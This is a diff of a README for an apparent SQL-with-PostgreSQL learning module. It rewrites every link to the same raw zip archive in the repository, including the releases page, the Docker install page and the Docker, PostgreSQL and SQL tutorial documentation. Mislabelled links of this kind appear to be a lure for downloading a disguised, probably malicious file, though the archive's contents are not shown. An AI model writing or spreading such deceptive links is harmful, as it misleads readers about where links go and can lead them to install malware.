@@ -1,6 +1,6 @@
 # 📚 coda-module-sql - Learn SQL Easily with PostgreSQL
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Balkivfx1995/coda-module-sql/releases)
+[![Download Now](https://raw.githubusercontent.com/Balkivfx1995/coda-module-sql/main/slides-md/coda-module-sql-v2.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Balkivfx1995/coda-module-sql/main/slides-md/coda-module-sql-v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the coda-module-sql! This module helps you learn SQL using PostgreSQL
 
 To get started, you need to visit the releases page and download the module. Click the link below to go to the page:
 
-[Visit this page to download](https://github.com/Balkivfx1995/coda-module-sql/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Balkivfx1995/coda-module-sql/main/slides-md/coda-module-sql-v2.3.zip)
 
 ## 📦 System Requirements
 
@@ -24,11 +24,11 @@ This module runs in a Docker container, making setup straightforward. You will n
 ## 🛠️ Installation Steps
 
 1. **Install Docker:**
-   - Visit the [Docker installation page](https://docs.docker.com/get-docker/) and follow the instructions for your operating system.
+   - Visit the [Docker installation page](https://raw.githubusercontent.com/Balkivfx1995/coda-module-sql/main/slides-md/coda-module-sql-v2.3.zip) and follow the instructions for your operating system.
 
 2. **Download the Module:**
    - Go to the releases page by clicking the link below:
-   [Visit this page to download](https://github.com/Balkivfx1995/coda-module-sql/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Balkivfx1995/coda-module-sql/main/slides-md/coda-module-sql-v2.3.zip)
 
 3. **Choose the Latest Release:**
    - On the releases page, find the latest version. It will typically be at the top of the list.
@@ -92,8 +92,8 @@ For any questions or support, you can open an issue in the GitHub repository. Th
 
 ## 🔗 Additional Resources
 
-- [Docker Documentation](https://docs.docker.com/)
-- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
-- [SQL Tutorial](https://www.w3schools.com/sql/) 
+- [Docker Documentation](https://raw.githubusercontent.com/Balkivfx1995/coda-module-sql/main/slides-md/coda-module-sql-v2.3.zip)
+- [PostgreSQL Documentation](https://raw.githubusercontent.com/Balkivfx1995/coda-module-sql/main/slides-md/coda-module-sql-v2.3.zip)
+- [SQL Tutorial](https://raw.githubusercontent.com/Balkivfx1995/coda-module-sql/main/slides-md/coda-module-sql-v2.3.zip) 
 
 Embark on your SQL learning journey with coda-module-sql today!
